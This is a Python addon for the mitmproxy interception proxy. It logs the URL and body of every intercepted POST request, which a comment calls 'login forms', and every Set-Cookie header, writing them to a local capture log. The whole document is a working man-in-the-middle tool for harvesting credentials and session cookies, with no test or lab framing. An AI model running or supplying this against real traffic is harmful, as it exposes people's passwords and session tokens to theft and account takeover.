from mitmproxy import http
import datetime
import os

LOG_FILE = "/logs/mitm_capture.log"

def log_data(data):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    os.makedirs("/logs", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] {data}\n")

def request(flow: http.HTTPFlow):
    # Log all POST requests (login forms)
    if flow.request.method == "POST":
        log_data(f"POST REQUEST TO: {flow.request.url}")
        log_data(f"BODY: {flow.request.get_text()}")

def response(flow: http.HTTPFlow):
    # Capture cookies from responses
    cookies = flow.response.headers.get("set-cookie", "")
    if cookies:
        log_data(f"COOKIE FROM: {flow.request.url}")
        log_data(f"COOKIE: {cookies}")
